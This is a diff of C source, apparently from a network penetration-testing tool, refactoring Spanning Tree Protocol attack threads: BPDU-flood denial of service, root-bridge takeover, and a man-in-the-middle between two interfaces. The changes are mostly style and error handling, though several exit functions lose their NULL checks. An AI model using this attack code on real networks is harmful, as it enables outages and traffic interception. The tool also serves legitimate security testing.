@@ -416,17 +416,15 @@ xstp_send_bpdu_tcn(u_int8_t mac_spoofing, struct stp_data *stp_data, struct inte
 /* Child/Thread loop sending */
 /* Hellos every 'Hello Time' */
 /*****************************/
-void
-xstp_send_hellos(void *arg)
+void xstp_send_hellos( void *arg )
 {
-    int32_t ret, i;
-    u_int16_t secs;
+    struct attacks *attacks = (struct attacks *)arg;
+    struct stp_data *stp_data = (struct stp_data *)attacks->data;
     struct timeval hello;
-    struct attacks *attacks;
-    struct stp_data *stp_data;
+    int ret;
+    int i=0;
+    u_int16_t secs = 0 ;
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->helper_th.finished);
 
     pthread_detach(pthread_self());
@@ -434,13 +432,7 @@ xstp_send_hellos(void *arg)
     hello.tv_sec  = 0;
     hello.tv_usec = 0;
 
-    attacks = arg;
-    stp_data = attacks->data;
-
-    secs = 0;
-    i = 0;
-    
-    write_log(0, "\n helper: %d started...\n", (int)pthread_self());
+    write_log(0, "\n helper: %X started...\n", (int)pthread_self());
         
     while(!attacks->helper_th.stop)
     {
@@ -477,7 +469,7 @@ xstp_send_hellos(void *arg)
         hello.tv_usec = 250000;
     } /* while...*/
 
-write_log(0," helper: %d finished...\n",(int)pthread_self());
+    write_log(0," helper: %X finished...\n",(int)pthread_self());
     
     pthread_mutex_unlock(&attacks->helper_th.finished);
          
@@ -489,18 +481,15 @@ write_log(0," helper: %d finished...\n",(int)pthread_self());
 /* DoS attack sending CONF BPDUs */
 /* with flag on                  */
 /*********************************/
-void
-xstp_th_dos_conf(void *arg)
+void xstp_th_dos_conf( void *arg )
 {
-    struct attacks *attacks=NULL;
+    struct attacks *attacks = (struct attacks *)arg;
     struct stp_data *stp_data;
     sigset_t mask;
 #ifdef LBL_ALIGN
     u_int16_t temp;
 #endif
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->attack_th.finished);
 
     pthread_detach(pthread_self());
@@ -550,11 +539,9 @@ xstp_th_dos_conf(void *arg)
 }
 
 
-void
-xstp_th_dos_conf_exit(struct attacks *attacks)
+void xstp_th_dos_conf_exit( struct attacks *attacks )
 {
-    if (attacks)
-       attack_th_exit(attacks);
+    attack_th_exit(attacks);
 
     pthread_mutex_unlock(&attacks->attack_th.finished);
      
@@ -623,19 +610,16 @@ xstp_th_dos_tcn_exit(struct attacks *attacks)
 /* or claiming the root bridge */
 /* if not RSTP                 */
 /*******************************/
-void 
-xstp_th_nondos_role(void *arg)
+void xstp_th_nondos_role( void *arg )
 {
-    struct attacks *attacks=NULL;
+    struct attacks *attacks = (struct attacks *)arg ;
     struct stp_data *stp_data;
     struct pcap_pkthdr header;
     struct timeval now;
     u_int8_t flags_tmp;
-    u_int8_t *packet=NULL, *stp_conf;
+    u_int8_t *packet, *stp_conf;
     sigset_t mask;
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->attack_th.finished);
 
     pthread_detach(pthread_self());
@@ -661,36 +645,44 @@ xstp_th_nondos_role(void *arg)
     xstp_decrement_bridgeid(stp_data);
 
     /* let the thread be created */
-    thread_create(&attacks->helper_th.id, &xstp_send_hellos, attacks);
+    // FRED thread_create(&attacks->helper_th.id, &xstp_send_hellos, attacks);
+    if ( thread_create( &attacks->helper_th, &xstp_send_hellos, attacks ) != 0 )
+    {
+        write_log( 0, "xstp_th_nondos_role thread_create()");
+        xstp_th_nondos_role_exit(attacks);
+    }
 
-    if ((packet = calloc(1, SNAPLEN)) == NULL)
+    packet = (uint8_t *)calloc( 1, SNAPLEN );
+
+    if ( ! packet )
         xstp_th_nondos_role_exit(attacks);
 
     while (!attacks->attack_th.stop)
     {
         interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet, PROTO_STP, NO_TIMEOUT);
-        if (attacks->attack_th.stop)
-           break;
-           
-        stp_conf = (packet + LIBNET_802_3_H + LIBNET_802_2_H);
 
-        switch (*(stp_conf+3))
+        if ( ! attacks->attack_th.stop )
         {
-            case BPDU_CONF_STP:
-            case BPDU_CONF_RSTP:
-                if ( *(stp_conf+3) == STP_TOPOLOGY_CHANGE) {
+            stp_conf = (packet + LIBNET_802_3_H + LIBNET_802_2_H);
+
+            switch (*(stp_conf+3))
+            {
+                case BPDU_CONF_STP:
+                case BPDU_CONF_RSTP:
+                    if ( *(stp_conf+3) == STP_TOPOLOGY_CHANGE) {
+                        flags_tmp = stp_data->flags;
+                        stp_data->flags |= STP_TOPOLOGY_CHANGE_ACK;
+                        xstp_send_all_bpdu_conf(arg);
+                        stp_data->flags = flags_tmp;
+                    }
+                break;
+                case BPDU_TCN:
                     flags_tmp = stp_data->flags;
                     stp_data->flags |= STP_TOPOLOGY_CHANGE_ACK;
                     xstp_send_all_bpdu_conf(arg);
                     stp_data->flags = flags_tmp;
-                }
-            break;
-            case BPDU_TCN:
-                flags_tmp = stp_data->flags;
-                stp_data->flags |= STP_TOPOLOGY_CHANGE_ACK;
-                xstp_send_all_bpdu_conf(arg);
-                stp_data->flags = flags_tmp;
-            break;
+                break;
+            }
         }
     }
 
@@ -700,11 +692,9 @@ xstp_th_nondos_role(void *arg)
 }
 
 
-void
-xstp_th_nondos_role_exit(struct attacks *attacks)
+void xstp_th_nondos_role_exit( struct attacks *attacks )
 {
-    if (attacks)
-       attack_th_exit(attacks);
+    attack_th_exit(attacks);
 
     pthread_mutex_unlock(&attacks->attack_th.finished);
      
@@ -718,21 +708,18 @@ xstp_th_nondos_role_exit(struct attacks *attacks)
 /* Child/Thread loop sending */
 /* Hellos every 'Hello Time' */
 /*****************************/
-void
-xstp_send_hellos_mitm(void *arg)
+void xstp_send_hellos_mitm( void *arg )
 {
     int32_t ret, i;
     u_int16_t secs;
     struct xstp_mitm_args *xstp_mitm_args;
     struct timeval hello;
-    struct attacks *attacks;
+    struct attacks *attacks = (struct attacks *)arg;
     struct stp_data *stp_data, *stp_data2;
     struct attack_param *param = NULL;
     dlist_t *p;
     struct interface_data *iface1, *iface2;
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->helper_th.finished);
 
     pthread_detach(pthread_self());
@@ -755,7 +742,7 @@ xstp_send_hellos_mitm(void *arg)
     secs = 0;
     i = 0;
     
-    write_log(0,"\n helper: %d started...\n",(int)pthread_self());
+    write_log(0,"\n helper: %X started...\n",(int)pthread_self());
         
     while(!attacks->helper_th.stop)
     {
@@ -794,7 +781,7 @@ xstp_send_hellos_mitm(void *arg)
         hello.tv_usec = 250000;
     } /* while...*/
 
-write_log(0," helper: %d finished...\n",(int)pthread_self());
+    write_log(0," helper: %d finished...\n",(int)pthread_self());
     
     pthread_mutex_unlock(&attacks->helper_th.finished);
          
@@ -809,23 +796,20 @@ write_log(0," helper: %d finished...\n",(int)pthread_self());
 /* or claiming the root bridge */
 /* if not RSTP                 */
 /*******************************/
-void 
-xstp_th_dos_mitm(void *arg)
+void xstp_th_dos_mitm( void *arg )
 {
-    struct attacks *attacks=NULL;
+    struct attacks *attacks = (struct attacks *)arg;
     struct attack_param *param;
     struct xstp_mitm_args xstp_mitm_args;
     struct stp_data *stp_data, stp_data2;
     struct pcap_pkthdr header;
     struct timeval now;
     u_int8_t flags_tmp, flags_tmp2;
-    u_int8_t *packet=NULL, *stp_conf;
+    u_int8_t *packet, *stp_conf;
     dlist_t *p;
     struct interface_data *iface, *iface1, *iface2;
     sigset_t mask;
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->attack_th.finished);
 
     pthread_detach(pthread_self());
@@ -863,6 +847,7 @@ xstp_th_dos_mitm(void *arg)
 
     if (xstp_learn_packet(attacks, iface1->ifname, &attacks->attack_th.stop, stp_data, &header) < 0)
         xstp_th_dos_mitm_exit(attacks);
+
     xstp_decrement_bridgeid(stp_data);
    
     memcpy((void *)&stp_data2, (void *)stp_data,sizeof(struct stp_data));
@@ -871,10 +856,16 @@ xstp_th_dos_mitm(void *arg)
         xstp_th_dos_mitm_exit(attacks);
     xstp_decrement_bridgeid(&stp_data2);
 
-    /* let the thread be created */
-    thread_create(&attacks->helper_th.id, &xstp_send_hellos, &xstp_mitm_args);
+    // FRED thread_create(&attacks->helper_th.id, &xstp_send_hellos, &xstp_mitm_args);
+    if ( thread_create( &attacks->helper_th, &xstp_send_hellos, &xstp_mitm_args) != 0 )
+    {
+        write_log( 0, "xstp_th_dos_mitm thread_create error\n");
+        xstp_th_dos_mitm_exit(attacks);
+    }
 
-    if ((packet = calloc(1, SNAPLEN)) == NULL)
+    packet = (uint8_t *)calloc( 1, SNAPLEN );
+
+    if ( ! packet )
         xstp_th_dos_mitm_exit(attacks);
 
     while (!attacks->attack_th.stop)
@@ -939,8 +930,7 @@ xstp_th_dos_mitm(void *arg)
 void
 xstp_th_dos_mitm_exit(struct attacks *attacks)
 {
-    if (attacks)
-       attack_th_exit(attacks);
+    attack_th_exit(attacks);
 
     pthread_mutex_unlock(&attacks->attack_th.finished);
      
@@ -954,17 +944,14 @@ xstp_th_dos_mitm_exit(struct attacks *attacks)
 /* NONDoS attack sending BPDUs */
 /* claiming other role         */
 /*******************************/
-void 
-xstp_th_nondos_other_role(void *arg)
+void xstp_th_nondos_other_role( void *arg )
 {
-    struct attacks *attacks=NULL;
+    struct attacks *attacks = (struct attacks *)arg;
     struct stp_data *stp_data;
     struct pcap_pkthdr header;
     struct timeval now;
     sigset_t mask;
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->attack_th.finished);
 
     pthread_detach(pthread_self());
@@ -973,9 +960,9 @@ xstp_th_nondos_other_role(void *arg)
 
     if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
     {
-      thread_error("xstp_th_nondos_role pthread_sigmask()",errno);
-      xstp_th_nondos_other_role_exit(attacks);
-   }
+        thread_error("xstp_th_nondos_role pthread_sigmask()",errno);
+        xstp_th_nondos_other_role_exit(attacks);
+    }
 
     stp_data = attacks->data;
 
@@ -992,16 +979,25 @@ xstp_th_nondos_other_role(void *arg)
     /* set a valid root pathcost */
     stp_data->root_pc = 666;
 
-    /* let the thread be created */
-    thread_create(&attacks->helper_th.id, &xstp_send_hellos, attacks);
+    if ( ! thread_create( &attacks->helper_th, &xstp_send_hellos, attacks ) )
+    {
+        while ( !attacks->attack_th.stop )
+        {
+#ifdef NEED_USLEEP
+            thread_usleep(100000);
+#endif
+        }
+    }
+    else
+        write_log(0,"xstp_th_nondos_other_role thread_create error\n" );
+
+    xstp_th_nondos_other_role_exit( attacks );
 }
 
 
-void
-xstp_th_nondos_other_role_exit(struct attacks *attacks)
+void xstp_th_nondos_other_role_exit( struct attacks *attacks )
 {
-    if (attacks)
-       attack_th_exit(attacks);
+    attack_th_exit(attacks);
 
     pthread_mutex_unlock(&attacks->attack_th.finished);
      
